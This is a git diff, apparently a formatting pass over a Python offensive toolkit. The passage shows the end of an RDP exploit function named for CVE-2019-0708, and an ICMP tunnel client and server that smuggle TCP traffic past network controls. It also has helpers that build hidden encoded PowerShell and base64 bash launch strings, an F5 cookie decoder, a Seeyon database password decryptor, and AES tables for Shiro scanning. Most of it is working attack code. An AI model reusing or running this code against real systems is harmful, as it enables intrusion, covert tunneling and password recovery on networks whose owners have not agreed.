-        s.sendall(rdp_encrypted_pkt(binascii.unhexlify("1a001700f103ea03010000010c00270000000000000003003200"), rc4enckey, hmackey))
+        s.sendall(
+            rdp_encrypted_pkt(
+                binascii.unhexlify(
+                    "1a001700f103ea03010000010c00270000000000000003003200"
+                ),
+                rc4enckey,
+                hmackey,
+            )
+        )
 
-        try_check(s,rc4enckey, hmackey,host)
+        try_check(s, rc4enckey, hmackey, host)
     except UnboundLocalError as e:
         return
     except socket.error as e:
@@ -3860,13 +3935,14 @@ def exploit0708(host, port=3389, hostname="", username=""):
     except IndexError as e:
         return
 
+
 # 0708 end
 
 
 # icmp tunnel start
 class IcmpSocket:
     def __init__(self, MODE):
-        self.ICMP_ECHO_REQUEST = 0x08 
+        self.ICMP_ECHO_REQUEST = 0x08
         self.ICMP_ECHO_REPLY = 0x00
         if MODE == 0:
             self.ICMP_SEND = self.ICMP_ECHO_REPLY
@@ -3876,33 +3952,35 @@ class IcmpSocket:
             self.ICMP_RECV = self.ICMP_ECHO_REPLY
             self.ICMP_SEND = self.ICMP_ECHO_REQUEST
             self.ICMP_CODE = 0x00
-            
+
         self.MAX_DATA_SIZE = 1024
         self.TIMEOUT = 300
         self.ID = 0x100
-        self.sock = socket.socket(socket.AF_INET, socket.SOCK_RAW,socket.getprotobyname("icmp"))
-        
+        self.sock = socket.socket(
+            socket.AF_INET, socket.SOCK_RAW, socket.getprotobyname("icmp")
+        )
+
     def bind(self, address):
-        self.sock.bind((address,0))
+        self.sock.bind((address, 0))
         return IcmpSocket
-    
+
     def checksum(self, source_string):
         sum = 0
         count_to = (len(source_string) / 2) * 2
         for count in xrange(0, count_to, 2):
             this = ord(source_string[count + 1]) * 256 + ord(source_string[count])
             sum = sum + this
-            sum = sum & 0xffffffff 
+            sum = sum & 0xFFFFFFFF
 
         if count_to < len(source_string):
             sum = sum + ord(source_string[len(source_string) - 1])
-            sum = sum & 0xffffffff 
+            sum = sum & 0xFFFFFFFF
 
-        sum = (sum >> 16) + (sum & 0xffff)
+        sum = (sum >> 16) + (sum & 0xFFFF)
         sum = sum + (sum >> 16)
         answer = ~sum
-        answer = answer & 0xffff
-        answer = answer >> 8 | (answer << 8 & 0xff00)
+        answer = answer & 0xFFFF
+        answer = answer >> 8 | (answer << 8 & 0xFF00)
 
         return answer
 
@@ -3911,16 +3989,16 @@ class IcmpSocket:
         while True:
             started_select = time.time()
             what_ready = select.select([self.sock], [], [], time_left)
-            how_long_in_select = (time.time() - started_select)
-            if what_ready[0] == []: 
+            how_long_in_select = time.time() - started_select
+            if what_ready[0] == []:
                 return
 
             time_received = time.time()
-            packet, addr = self.sock.recvfrom(buffsize+28)
+            packet, addr = self.sock.recvfrom(buffsize + 28)
             icmpHeader = packet[20:28]
             type, code, checksum, packetID, sequence = struct.unpack(
-            "bbHHh", icmpHeader 
-                )
+                "bbHHh", icmpHeader
+            )
             if type == self.ICMP_RECV and code == self.ICMP_CODE:
                 return packet[28:], packetID, sequence, addr
 
@@ -3928,39 +4006,51 @@ class IcmpSocket:
             if time_left <= 0:
                 return
 
-    def send(self, dest_addr, data,packetID, sequence):
-        dest_addr  =  socket.gethostbyname(dest_addr)
+    def send(self, dest_addr, data, packetID, sequence):
+        dest_addr = socket.gethostbyname(dest_addr)
         my_checksum = 0
-        header = struct.pack("bbHHh", self.ICMP_SEND, self.ICMP_CODE, my_checksum, packetID, sequence)
+        header = struct.pack(
+            "bbHHh", self.ICMP_SEND, self.ICMP_CODE, my_checksum, packetID, sequence
+        )
         my_checksum = self.checksum(header + data)
         header = struct.pack(
-            "bbHHh",  self.ICMP_SEND, self.ICMP_CODE, socket.htons(my_checksum), packetID, sequence
+            "bbHHh",
+            self.ICMP_SEND,
+            self.ICMP_CODE,
+            socket.htons(my_checksum),
+            packetID,
+            sequence,
         )
         packet = header + data
         self.sock.sendto(packet, (dest_addr, 1))
-        
-def GetMd5(src):
-        m = md5.new()  
-        m.update(src)   
-        return m.hexdigest()
-def PrintHex(buf):
-        print("Data:")
-        for b in buf:
-            print(hex(ord(b)),)
 
-     
+
+def GetMd5(src):
+    m = md5.new()
+    m.update(src)
+    return m.hexdigest()
+
+
+def PrintHex(buf):
+    print("Data:")
+    for b in buf:
+        print(
+            hex(ord(b)),
+        )
+
+
 def _TransData(ss, icmpsock, rip):
     socks = []
     socks.append(ss)
     socks.append(icmpsock.sock)
-    while(True):
+    while True:
         try:
-            r, w, e = select.select(socks, [], socks,0.2)
+            r, w, e = select.select(socks, [], socks, 0.2)
             if ss in r:
                 try:
                     recv = ss.recv(PACKETSIZE)
                     print("TCP Recv: <", len(recv), "> bytes")
-                    if(len(recv) > 0):
+                    if len(recv) > 0:
                         icmpsock.send(rip, recv, icmpsock.ID, SEQUENCE)
                         print("ICMP Send: <", len(recv), "> bytes")
                     else:
@@ -3973,10 +4063,10 @@ def _TransData(ss, icmpsock, rip):
                     return -1
             elif (icmpsock.sock) in r:
                 recv, id, seq, addr = icmpsock.recv(PACKETSIZE)
-                if(recv == CLOSETCPFLAG):
+                if recv == CLOSETCPFLAG:
                     print("Victimer is offline")
                     ss.close()
-                    return -1 
+                    return -1
                 else:
                     print("ICMP Recv: <", len(recv), "> bytes")
                     ss.send(recv)
@@ -3984,47 +4074,48 @@ def _TransData(ss, icmpsock, rip):
             else:
                 icmpsock.send(rip, HEARTBEATFLAG, icmpsock.ID, SEQUENCE)
         except Exception as e:
-            print(e,sys._getframe().f_lineno)
+            print(e, sys._getframe().f_lineno)
             return -1
-            
+
+
 def _StartConnect(rip, mode, tip, tport):
     global SEQUENCE
     global HEARTBEATFLAG
     global CLOSETCPFLAG
-    
-    icmpsock = IcmpSocket(mode)   #1 Client Mode
+
+    icmpsock = IcmpSocket(mode)  # 1 Client Mode
     icmpsock.bind("0.0.0.0")
-    icmpsock.send(rip,VER + HANDSHAKE, icmpsock.ID,SEQUENCE)
-    data,id,seq,addr = icmpsock.recv(2)
+    icmpsock.send(rip, VER + HANDSHAKE, icmpsock.ID, SEQUENCE)
+    data, id, seq, addr = icmpsock.recv(2)
     PrintHex(data)
     ExitCode = 1
-    if( seq != 0):
+    if seq != 0:
         SEQUENCE = seq
         HEARTBEATFLAG = GetMd5(str(seq) + "TS")
         CLOSETCPFLAG = GetMd5(str(seq) + "TCP")
-        icmpsock.send(rip,HEARTBEATFLAG,icmpsock.ID,SEQUENCE)
-        if(ord(data[0]) == 1 and ord(data[1]) == 0) :
-            while(ExitCode):
+        icmpsock.send(rip, HEARTBEATFLAG, icmpsock.ID, SEQUENCE)
+        if ord(data[0]) == 1 and ord(data[1]) == 0:
+            while ExitCode:
                 data, _id, seq, addr = icmpsock.recv(2)
                 print(addr)
                 PrintHex(data)
-                if(ord(data[0]) == 0 and ord(data[1]) == 0):
+                if ord(data[0]) == 0 and ord(data[1]) == 0:
                     cs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                     cs.connect((tip, tport))
                     print("Connecting to  target's host Succ")
                     ExitCode = _TransData(cs, icmpsock, rip)
 
 
-
 # icmp tunnel end
 
 # icmp Stunnel start
 
+
 class SIcmpSocket:
     def __init__(self, MODE):
-        self.ICMP_ECHO_REQUEST = 0x08 
+        self.ICMP_ECHO_REQUEST = 0x08
         self.ICMP_ECHO_REPLY = 0x00
-        if (MODE == 0):
+        if MODE == 0:
             self.ICMP_SEND = self.ICMP_ECHO_REPLY
             self.ICMP_RECV = self.ICMP_ECHO_REQUEST
             self.ICMP_CODE = 0x00
@@ -4036,7 +4127,9 @@ class SIcmpSocket:
         self.MAX_DATA_SIZE = 1024
         self.TIMEOUT = 300
         self.ID = 0x100
-        self.sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.getprotobyname("icmp"))
+        self.sock = socket.socket(
+            socket.AF_INET, socket.SOCK_RAW, socket.getprotobyname("icmp")
+        )
 
     def bind(self, address):
         self.sock.bind((address, 0))
@@ -4048,17 +4141,17 @@ class SIcmpSocket:
         for count in xrange(0, count_to, 2):
             this = ord(source_string[count + 1]) * 256 + ord(source_string[count])
             sum = sum + this
-            sum = sum & 0xffffffff 
+            sum = sum & 0xFFFFFFFF
 
         if count_to < len(source_string):
             sum = sum + ord(source_string[len(source_string) - 1])
-            sum = sum & 0xffffffff 
+            sum = sum & 0xFFFFFFFF
 
-        sum = (sum >> 16) + (sum & 0xffff)
+        sum = (sum >> 16) + (sum & 0xFFFF)
         sum = sum + (sum >> 16)
         answer = ~sum
-        answer = answer & 0xffff
-        answer = answer >> 8 | (answer << 8 & 0xff00)
+        answer = answer & 0xFFFF
+        answer = answer >> 8 | (answer << 8 & 0xFF00)
 
         return answer
 
@@ -4067,66 +4160,78 @@ class SIcmpSocket:
         while True:
             started_select = time.time()
             what_ready = select.select([self.sock], [], [], time_left)
-            how_long_in_select = (time.time() - started_select)
-            if what_ready[0] == []: 
+            how_long_in_select = time.time() - started_select
+            if what_ready[0] == []:
                 return
             time_received = time.time()
-            packet, addr = self.sock.recvfrom(buffsize+28)
+            packet, addr = self.sock.recvfrom(buffsize + 28)
             icmpHeader = packet[20:28]
             type, code, checksum, packetID, sequence = struct.unpack(
-            "bbHHh", icmpHeader
-                )
+                "bbHHh", icmpHeader
+            )
             if type == self.ICMP_RECV and code == self.ICMP_CODE:
-                return packet[28:],packetID,sequence,addr
+                return packet[28:], packetID, sequence, addr
             time_left = time_left - how_long_in_select
             if time_left <= 0:
                 return
 
-    def send(self, dest_addr, data,packetID, sequence):
-        dest_addr  =  socket.gethostbyname(dest_addr)
+    def send(self, dest_addr, data, packetID, sequence):
+        dest_addr = socket.gethostbyname(dest_addr)
         my_checksum = 0
-        header = struct.pack("bbHHh", self.ICMP_SEND, self.ICMP_CODE, my_checksum, packetID, sequence)
+        header = struct.pack(
+            "bbHHh", self.ICMP_SEND, self.ICMP_CODE, my_checksum, packetID, sequence
+        )
         my_checksum = self.checksum(header + data)
         header = struct.pack(
-            "bbHHh",  self.ICMP_SEND, self.ICMP_CODE, socket.htons(my_checksum), packetID, sequence
+            "bbHHh",
+            self.ICMP_SEND,
+            self.ICMP_CODE,
+            socket.htons(my_checksum),
+            packetID,
+            sequence,
         )
         packet = header + data
         self.sock.sendto(packet, (dest_addr, 1))
-       
+
     def PrintData(self, buf):
         print("Data:")
         for b in buf:
-            print(hex(ord(b)),)
-            
+            print(
+                hex(ord(b)),
+            )
+
+
 def _GetSockNum():
-    while(True):
-        id=random.randint(10000, 32767)
-        if(id not in gSOCKETID):
+    while True:
+        id = random.randint(10000, 32767)
+        if id not in gSOCKETID:
             break
     return id
-    
+
+
 def _GetMd5(src):
-        m = md5.new()  
-        m.update(src)   
-        return m.hexdigest()
-        
-def _STransData(ss,obj):
+    m = md5.new()
+    m.update(src)
+    return m.hexdigest()
+
+
+def _STransData(ss, obj):
     Timeout = 30
     startTime = 0
     data = ""
     while True:
         try:
-            if(startTime == 0):
+            if startTime == 0:
                 startTime = time.time()
-            elif(time.time() - startTime > Timeout):
+            elif time.time() - startTime > Timeout:
                 return 0
-                
+
             r, w, e = select.select([ss], [], [ss], 0.2)
             if ss in r:
                 try:
                     recv = ss.recv(1024)
                     print("TCP: Recv <", len(recv), ">bytes")
-                    if(len(recv)>0):
+                    if len(recv) > 0:
                         obj["OutQueue"].put(recv)
                         print("ICMP: Send <", len(recv), ">bytes")
                     else:
@@ -4138,8 +4243,8 @@ def _STransData(ss,obj):
                     print(e, sys._getframe().f_lineno)
                     obj["OutQueue"].put(obj["CloseTCPFlag"])
                     return -1
-                    
-            elif (obj["InQueue"].empty() == False):
+
+            elif obj["InQueue"].empty() == False:
                 startTime = 0
                 while obj["InQueue"].qsize() > 0:
                     recv = obj["InQueue"].get()
@@ -4149,21 +4254,25 @@ def _STransData(ss,obj):
                     else:
                         data = data + recv
                         print("ICMP: Recv <", len(data), ">bytes")
-                    if(obj["CanSend"]):
-                            if(len(data) > 0):
-                                ss.send(data)
-                                print("Tcp: Send <", len(data), ">bytes")
-                            obj["CanSend"] == False
-                            data = ""
-                       
+                    if obj["CanSend"]:
+                        if len(data) > 0:
+                            ss.send(data)
+                            print("Tcp: Send <", len(data), ">bytes")
+                        obj["CanSend"] == False
+                        data = ""
+
         except Exception as e:
             print(e, sys._getframe().f_lineno)
             break
 
+
 def PrintHex(buf):
     print("Data:")
     for b in buf:
-        print(hex(ord(b)), )
+        print(
+            hex(ord(b)),
+        )
+
 
 def _ProcessNewClient(obj, addr):
     rs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -4171,45 +4280,47 @@ def _ProcessNewClient(obj, addr):
     rs.listen(10)
     socks = []
     socks.append(rs)
-    ip,sp = rs.getsockname()
+    ip, sp = rs.getsockname()
     obj["OutQueue"].put("\x01\x00")
     print("Your server port is :" + str(sp))
-    #obj["OutQueue"].put("Your server port is :"+str(sp))
+    # obj["OutQueue"].put("Your server port is :"+str(sp))
     ExitCode = 1
     while ExitCode:
         try:
             r, w, e = select.select(socks, [], socks)
-            if(rs in r):
-                ss,laddr = rs.accept()
+            if rs in r:
+                ss, laddr = rs.accept()
                 print("Attacker ip from " + str(laddr[0]) + " is Connected!")
                 obj["OutQueue"].put("\x00\x00")
             elif e.count > 0:
                 break
         except Exception as e:
-                print("Tunnel has been closed", e)
-                break
+            print("Tunnel has been closed", e)
+            break
 
         print("Now starting translate data...")
         ExitCode = _STransData(ss, obj)
-        
+
     gSOCKETID.remove(obj["Num"])
     gCLIENTOBJ.remove(obj)
     print("Translate data is over...")
-    
+
+
 def _ForwardData():
     while True:
         for obj in gCLIENTOBJ:
-            if(obj["OutQueue"].empty() == False):
+            if obj["OutQueue"].empty() == False:
                 recv = obj["OutQueue"].get()
                 ICMPSOCK.send(obj["Address"], recv, obj["Identifier"], obj["Num"])
+
 
 def _DataCenter():
     td = threading.Thread(target=_ForwardData)
     td.start()
     while True:
         try:
-            data,id,seq,addr=ICMPSOCK.recv(1024)
-            if(seq == 0 and data[0:7] == "\x01\x01" + HANDSHAKE):
+            data, id, seq, addr = ICMPSOCK.recv(1024)
+            if seq == 0 and data[0:7] == "\x01\x01" + HANDSHAKE:
                 sockNum = _GetSockNum()
                 gSOCKETID.append(sockNum)
                 obj = {
@@ -4220,11 +4331,11 @@ def _DataCenter():
                     "Identifier": id,
                     "CanSend": False,
                     "HeartBeatFlag": _GetMd5(str(sockNum) + "TS"),
-                    "CloseTCPFlag": _GetMd5(str(sockNum) + "TCP")
+                    "CloseTCPFlag": _GetMd5(str(sockNum) + "TCP"),
                 }
                 obj["Identifier"] = id
                 gCLIENTOBJ.append(obj)
-                print("Accpet new client from :", sockNum,addr[0])
+                print("Accpet new client from :", sockNum, addr[0])
                 t = threading.Thread(target=_ProcessNewClient, args=(obj, addr[0]))
                 t.start()
             elif seq in gSOCKETID:
@@ -4237,11 +4348,13 @@ def _DataCenter():
         except Exception as e:
             print(e)
 
+
 def _StartServer(lip, Mode):
     global ICMPSOCK
-    ICMPSOCK = SIcmpSocket(Mode)   #0 Server Mode
+    ICMPSOCK = SIcmpSocket(Mode)  # 0 Server Mode
     ICMPSOCK.bind(lip)
     _DataCenter()
+
 
 # icmp Stunnel end
 
@@ -4269,7 +4382,11 @@ class coding:
         try:
             print(info("[*]") + cmd)
             powershell_code = cmd
-            full_attack = info("[*]") + "powershell -nop -win hidden -exec bypass -noni -enc " + base64.b64encode(powershell_code.encode("utf_16_le"))  
+            full_attack = (
+                info("[*]")
+                + "powershell -nop -win hidden -exec bypass -noni -enc "
+                + base64.b64encode(powershell_code.encode("utf_16_le"))
+            )
             print(full_attack)
         except ValueError as e:
             print("Cookie ValueError")
@@ -4280,28 +4397,48 @@ class coding:
             print(info("[*]") + cmd)
             bash_code = cmd
             cmd_b64 = base64.b64encode(bash_code.encode("utf-8"))
-            full_attack = info("[*]") + "bash -c \"{echo," + cmd_b64 + "}|{base64,-d}|{bash,-i}\""
+            full_attack = (
+                info("[*]") + 'bash -c "{echo,' + cmd_b64 + '}|{base64,-d}|{bash,-i}"'
+            )
             print(full_attack)
         except ValueError as e:
             print("Cookie ValueError")
 
     @staticmethod
     def f5(f5_string):
-        try:            
+        try:
             encoded_string = f5_string
             print(info("[*]") + "String to decode: %s\n" % encoded_string)
             if encoded_string.startswith("rd"):
-                f5pattern = re.compile("rd(\d*)o00000000000000000000ffff([0-9a-fA-F]*)o(\d*)")
+                f5pattern = re.compile(
+                    "rd(\d*)o00000000000000000000ffff([0-9a-fA-F]*)o(\d*)"
+                )
                 result = f5pattern.findall(encoded_string)
                 if len(result) != 0 and result[0] != None and len(result[0]) == 3:
-                    f5id,f5ip,f5port = result[0]
-                    print(info("[*]") + "id: {id}   ip: {ip}   port: {port}".format(id=f5id,ip=".".join([str(int(f5ip,16)/(256**i)%256) for i in range(3,-1,-1)]), port=f5port ))
+                    f5id, f5ip, f5port = result[0]
+                    print(
+                        info("[*]")
+                        + "id: {id}   ip: {ip}   port: {port}".format(
+                            id=f5id,
+                            ip=".".join(
+                                [
+                                    str(int(f5ip, 16) / (256**i) % 256)
+                                    for i in range(3, -1, -1)
+                                ]
+                            ),
+                            port=f5port,
+                        )
+                    )
             else:
                 (host, port, end) = encoded_string.split(".")
                 (a, b, c, d) = [ord(i) for i in struct.pack("<I", int(host))]
                 (e) = [ord(e) for e in struct.pack("<H", int(port))]
                 port = "0x%02X%02X" % (e[0], e[1])
-                print(info("[*]") + "Decoded Host and Port: %s.%s.%s.%s:%s\n" % (a, b, c, d, int(port, 16)))
+                print(
+                    info("[*]")
+                    + "Decoded Host and Port: %s.%s.%s.%s:%s\n"
+                    % (a, b, c, d, int(port, 16))
+                )
         except ValueError as e:
             print("Cookie ValueError")
 
@@ -4309,18 +4446,19 @@ class coding:
     def seeyon(encrypt_passwd):
         try:
             crypt_passwd = encrypt_passwd
-            x = "/".join(crypt_passwd.split('/')[1:][1:])
+            x = "/".join(crypt_passwd.split("/")[1:][1:])
             a = base64.b64decode(x)
             s = ""
             for i in a:
                 s += chr(ord(i) - 1)
-            print(info("[*]")+"Seeyon Database passwd Decrypt: %s\n" % s)
+            print(info("[*]") + "Seeyon Database passwd Decrypt: %s\n" % s)
         except ValueError as e:
-            print('Cookie ValueError')
+            print("Cookie ValueError")
+
 
 # Class of AES for shiro scan
 class AES:
-    
+
     # Number of rounds by keysize
     number_of_rounds = {16: 10, 24: 12, 32: 14}
 
@@ -4329,7 +4467,7 @@ class AES:
 
     # S-box and Inverse S-box (S is for Substitution)
     S = [ 0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76, 0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0, 0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15, 0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75, 0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84, 0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf, 0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8, 0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2, 0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73, 0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb, 0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79, 0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08, 0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a, 0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e, 0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf, 0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16 ]
-    Si =[ 0x52, 0x09, 0x6a, 0xd5, 0x30, 0x36, 0xa5, 0x38, 0xbf, 0x40, 0xa3, 0x9e, 0x81, 0xf3, 0xd7, 0xfb, 0x7c, 0xe3, 0x39, 0x82, 0x9b, 0x2f, 0xff, 0x87, 0x34, 0x8e, 0x43, 0x44, 0xc4, 0xde, 0xe9, 0xcb, 0x54, 0x7b, 0x94, 0x32, 0xa6, 0xc2, 0x23, 0x3d, 0xee, 0x4c, 0x95, 0x0b, 0x42, 0xfa, 0xc3, 0x4e, 0x08, 0x2e, 0xa1, 0x66, 0x28, 0xd9, 0x24, 0xb2, 0x76, 0x5b, 0xa2, 0x49, 0x6d, 0x8b, 0xd1, 0x25, 0x72, 0xf8, 0xf6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xd4, 0xa4, 0x5c, 0xcc, 0x5d, 0x65, 0xb6, 0x92, 0x6c, 0x70, 0x48, 0x50, 0xfd, 0xed, 0xb9, 0xda, 0x5e, 0x15, 0x46, 0x57, 0xa7, 0x8d, 0x9d, 0x84, 0x90, 0xd8, 0xab, 0x00, 0x8c, 0xbc, 0xd3, 0x0a, 0xf7, 0xe4, 0x58, 0x05, 0xb8, 0xb3, 0x45, 0x06, 0xd0, 0x2c, 0x1e, 0x8f, 0xca, 0x3f, 0x0f, 0x02, 0xc1, 0xaf, 0xbd, 0x03, 0x01, 0x13, 0x8a, 0x6b, 0x3a, 0x91, 0x11, 0x41, 0x4f, 0x67, 0xdc, 0xea, 0x97, 0xf2, 0xcf, 0xce, 0xf0, 0xb4, 0xe6, 0x73, 0x96, 0xac, 0x74, 0x22, 0xe7, 0xad, 0x35, 0x85, 0xe2, 0xf9, 0x37, 0xe8, 0x1c, 0x75, 0xdf, 0x6e, 0x47, 0xf1, 0x1a, 0x71, 0x1d, 0x29, 0xc5, 0x89, 0x6f, 0xb7, 0x62, 0x0e, 0xaa, 0x18, 0xbe, 0x1b, 0xfc, 0x56, 0x3e, 0x4b, 0xc6, 0xd2, 0x79, 0x20, 0x9a, 0xdb, 0xc0, 0xfe, 0x78, 0xcd, 0x5a, 0xf4, 0x1f, 0xdd, 0xa8, 0x33, 0x88, 0x07, 0xc7, 0x31, 0xb1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xec, 0x5f, 0x60, 0x51, 0x7f, 0xa9, 0x19, 0xb5, 0x4a, 0x0d, 0x2d, 0xe5, 0x7a, 0x9f, 0x93, 0xc9, 0x9c, 0xef, 0xa0, 0xe0, 0x3b, 0x4d, 0xae, 0x2a, 0xf5, 0xb0, 0xc8, 0xeb, 0xbb, 0x3c, 0x83, 0x53, 0x99, 0x61, 0x17, 0x2b, 0x04, 0x7e, 0xba, 0x77, 0xd6, 0x26, 0xe1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0c, 0x7d ] 
+    Si =[ 0x52, 0x09, 0x6a, 0xd5, 0x30, 0x36, 0xa5, 0x38, 0xbf, 0x40, 0xa3, 0x9e, 0x81, 0xf3, 0xd7, 0xfb, 0x7c, 0xe3, 0x39, 0x82, 0x9b, 0x2f, 0xff, 0x87, 0x34, 0x8e, 0x43, 0x44, 0xc4, 0xde, 0xe9, 0xcb, 0x54, 0x7b, 0x94, 0x32, 0xa6, 0xc2, 0x23, 0x3d, 0xee, 0x4c, 0x95, 0x0b, 0x42, 0xfa, 0xc3, 0x4e, 0x08, 0x2e, 0xa1, 0x66, 0x28, 0xd9, 0x24, 0xb2, 0x76, 0x5b, 0xa2, 0x49, 0x6d, 0x8b, 0xd1, 0x25, 0x72, 0xf8, 0xf6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xd4, 0xa4, 0x5c, 0xcc, 0x5d, 0x65, 0xb6, 0x92, 0x6c, 0x70, 0x48, 0x50, 0xfd, 0xed, 0xb9, 0xda, 0x5e, 0x15, 0x46, 0x57, 0xa7, 0x8d, 0x9d, 0x84, 0x90, 0xd8, 0xab, 0x00, 0x8c, 0xbc, 0xd3, 0x0a, 0xf7, 0xe4, 0x58, 0x05, 0xb8, 0xb3, 0x45, 0x06, 0xd0, 0x2c, 0x1e, 0x8f, 0xca, 0x3f, 0x0f, 0x02, 0xc1, 0xaf, 0xbd, 0x03, 0x01, 0x13, 0x8a, 0x6b, 0x3a, 0x91, 0x11, 0x41, 0x4f, 0x67, 0xdc, 0xea, 0x97, 0xf2, 0xcf, 0xce, 0xf0, 0xb4, 0xe6, 0x73, 0x96, 0xac, 0x74, 0x22, 0xe7, 0xad, 0x35, 0x85, 0xe2, 0xf9, 0x37, 0xe8, 0x1c, 0x75, 0xdf, 0x6e, 0x47, 0xf1, 0x1a, 0x71, 0x1d, 0x29, 0xc5, 0x89, 0x6f, 0xb7, 0x62, 0x0e, 0xaa, 0x18, 0xbe, 0x1b, 0xfc, 0x56, 0x3e, 0x4b, 0xc6, 0xd2, 0x79, 0x20, 0x9a, 0xdb, 0xc0, 0xfe, 0x78, 0xcd, 0x5a, 0xf4, 0x1f, 0xdd, 0xa8, 0x33, 0x88, 0x07, 0xc7, 0x31, 0xb1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xec, 0x5f, 0x60, 0x51, 0x7f, 0xa9, 0x19, 0xb5, 0x4a, 0x0d, 0x2d, 0xe5, 0x7a, 0x9f, 0x93, 0xc9, 0x9c, 0xef, 0xa0, 0xe0, 0x3b, 0x4d, 0xae, 0x2a, 0xf5, 0xb0, 0xc8, 0xeb, 0xbb, 0x3c, 0x83, 0x53, 0x99, 0x61, 0x17, 0x2b, 0x04, 0x7e, 0xba, 0x77, 0xd6, 0x26, 0xe1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0c, 0x7d ]
 
     # Transformations for encryption
     T1 = [ 0xc66363a5, 0xf87c7c84, 0xee777799, 0xf67b7b8d, 0xfff2f20d, 0xd66b6bbd, 0xde6f6fb1, 0x91c5c554, 0x60303050, 0x02010103, 0xce6767a9, 0x562b2b7d, 0xe7fefe19, 0xb5d7d762, 0x4dababe6, 0xec76769a, 0x8fcaca45, 0x1f82829d, 0x89c9c940, 0xfa7d7d87, 0xeffafa15, 0xb25959eb, 0x8e4747c9, 0xfbf0f00b, 0x41adadec, 0xb3d4d467, 0x5fa2a2fd, 0x45afafea, 0x239c9cbf, 0x53a4a4f7, 0xe4727296, 0x9bc0c05b, 0x75b7b7c2, 0xe1fdfd1c, 0x3d9393ae, 0x4c26266a, 0x6c36365a, 0x7e3f3f41, 0xf5f7f702, 0x83cccc4f, 0x6834345c, 0x51a5a5f4, 0xd1e5e534, 0xf9f1f108, 0xe2717193, 0xabd8d873, 0x62313153, 0x2a15153f, 0x0804040c, 0x95c7c752, 0x46232365, 0x9dc3c35e, 0x30181828, 0x379696a1, 0x0a05050f, 0x2f9a9ab5, 0x0e070709, 0x24121236, 0x1b80809b, 0xdfe2e23d, 0xcdebeb26, 0x4e272769, 0x7fb2b2cd, 0xea75759f, 0x1209091b, 0x1d83839e, 0x582c2c74, 0x341a1a2e, 0x361b1b2d, 0xdc6e6eb2, 0xb45a5aee, 0x5ba0a0fb, 0xa45252f6, 0x763b3b4d, 0xb7d6d661, 0x7db3b3ce, 0x5229297b, 0xdde3e33e, 0x5e2f2f71, 0x13848497, 0xa65353f5, 0xb9d1d168, 0x00000000, 0xc1eded2c, 0x40202060, 0xe3fcfc1f, 0x79b1b1c8, 0xb65b5bed, 0xd46a6abe, 0x8dcbcb46, 0x67bebed9, 0x7239394b, 0x944a4ade, 0x984c4cd4, 0xb05858e8, 0x85cfcf4a, 0xbbd0d06b, 0xc5efef2a, 0x4faaaae5, 0xedfbfb16, 0x864343c5, 0x9a4d4dd7, 0x66333355, 0x11858594, 0x8a4545cf, 0xe9f9f910, 0x04020206, 0xfe7f7f81, 0xa05050f0, 0x783c3c44, 0x259f9fba, 0x4ba8a8e3, 0xa25151f3, 0x5da3a3fe, 0x804040c0, 0x058f8f8a, 0x3f9292ad, 0x219d9dbc, 0x70383848, 0xf1f5f504, 0x63bcbcdf, 0x77b6b6c1, 0xafdada75, 0x42212163, 0x20101030, 0xe5ffff1a, 0xfdf3f30e, 0xbfd2d26d, 0x81cdcd4c, 0x180c0c14, 0x26131335, 0xc3ecec2f, 0xbe5f5fe1, 0x359797a2, 0x884444cc, 0x2e171739, 0x93c4c457, 0x55a7a7f2, 0xfc7e7e82, 0x7a3d3d47, 0xc86464ac, 0xba5d5de7, 0x3219192b, 0xe6737395, 0xc06060a0, 0x19818198, 